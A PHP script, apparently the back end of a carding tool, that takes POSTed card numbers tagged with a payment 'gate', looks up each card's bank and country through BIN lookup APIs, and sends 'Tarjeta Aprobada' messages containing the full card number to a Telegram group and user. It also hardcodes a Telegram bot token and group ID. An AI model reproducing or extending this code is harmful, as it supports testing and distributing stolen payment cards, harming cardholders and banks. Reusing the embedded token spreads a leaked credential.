<?php
// Función para hacer solicitudes a la API
function makeApiRequest($url) {
    $options = [
        'http' => [
            'header' => "Accept-Version: 3\r\n"
        ]
    ];
    
    $context = stream_context_create($options);
    return @file_get_contents($url, false, $context);
}

// Función para verificar si se puede hacer una solicitud a la API
function canMakeRequest() {
    $limit = 10; // Máximo 10 solicitudes por minuto
    $file = "bin_cache/request_count.txt";

    if (!file_exists($file)) {
        file_put_contents($file, time() . "|0");
    }

    list($lastTime, $count) = explode("|", file_get_contents($file));

    if (time() - $lastTime > 60) {
        // Reiniciar el contador después de 1 minuto
        file_put_contents($file, time() . "|1");
        return true;
    }

    if ($count < $limit) {
        file_put_contents($file, $lastTime . "|" . ($count + 1));
        return true;
    }

    return false; // Límite alcanzado
}

// Función para obtener información de la tarjeta
function getCardInfo($cardNumber) {
    if (!canMakeRequest()) {
        return [
            'type' => 'Crédito/Débito',
            'country' => 'Internacional',
            'bank' => 'Banco no disponible',
            'scheme' => 'Visa/Mastercard'
        ];
    }

    $bin = substr($cardNumber, 0, 6);
    $cacheFile = "bin_cache/$bin.json"; // Archivo de caché para este BIN

    // Verificar si ya tenemos una respuesta en caché
    if (file_exists($cacheFile)) {
        $data = json_decode(file_get_contents($cacheFile), true);
        return $data;
    }

    // Intentar con la API principal (Binlist)
    $url1 = "https://lookup.binlist.net/$bin";
    $response = makeApiRequest($url1);

    // Si la API principal no responde, intentar con la API de respaldo (BinAPI)
    if ($response === FALSE) {
        $url2 = "https://api.binlist.net/v1/$bin"; // Ejemplo de API de respaldo
        $response = makeApiRequest($url2);
    }

    if ($response === FALSE) {
        // Si ninguna API responde, devolver valores predeterminados
        return [
            'type' => 'Crédito/Débito',
            'country' => 'Internacional',
            'bank' => 'Banco no disponible',
            'scheme' => 'Visa/Mastercard'
        ];
    }
    
    $data = json_decode($response, true);
    
    // Extraer el nombre del banco y el país correctamente
    $bankName = $data['bank']['name'] ?? 'Banco no disponible';
    $countryName = $data['country']['name'] ?? 'Internacional';
    
    // Guardar la respuesta en caché
    file_put_contents($cacheFile, json_encode([
        'type' => $data['type'] ?? 'Crédito/Débito',
        'country' => $countryName,
        'bank' => $bankName,
        'scheme' => $data['scheme'] ?? 'Visa/Mastercard'
    ]));
    
    return [
        'type' => $data['type'] ?? 'Crédito/Débito',
        'country' => $countryName,
        'bank' => $bankName,
        'scheme' => $data['scheme'] ?? 'Visa/Mastercard'
    ];
}

// Función para enviar mensajes a Telegram
function sendToTelegram($card, $time, $username, $telegramUserId = null, $gate = null) {
    $botToken = '7965095632:AAHqNE5YHCr-UXdcZaShjPZzmelQDkQsWXA'; // Token del bot

    // Obtener información de la tarjeta
    $cardInfo = getCardInfo($card);
    
    // Mensaje a enviar
    $message = "✅ *Tarjeta Aprobada:*\n\n" .
               "`$card`\n\n" .
               "👤 *Usuario:* $username\n" .
               "🏦 *Banco:* " . $cardInfo['bank'] . "\n" .
               "💳 *Tipo:* " . ucfirst($cardInfo['type']) . "\n" .
               "🔖 *Red:* " . ucfirst($cardInfo['scheme']) . "\n" .
               "🌍 *País:* " . $cardInfo['country'] . "\n" .
               "⏱ *Tiempo:* $time\n" .
               "🚪 *Gate:* " . ($gate ?? 'No especificado'); // Nuevo campo: Gate

    // Enviar al grupo de Telegram
    $groupChatId = '-1002467828056'; // ID del grupo
    sendMessageToTelegram($botToken, $groupChatId, $message);

    // Enviar al usuario individual (si tiene Telegram ID)
    if ($telegramUserId) {
        sendMessageToTelegram($botToken, $telegramUserId, $message);
    }
}


// Función para enviar mensajes a Telegram (implementación)
function sendMessageToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Lógica principal para manejar solicitudes POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card = $_POST['card'];
    $time = $_POST['time'];
    $username = $_POST['username'];
    $telegramUserId = $_POST['telegram_id'] ?? null; // Recibir el ID de Telegram del usuario
    $gate = $_POST['gate'] ?? null; // Recibir el gate (por ejemplo, "VipOne (PAYZER)")

    // Llamar a la función con el nuevo parámetro
    sendToTelegram($card, $time, $username, $telegramUserId, $gate);
}
?>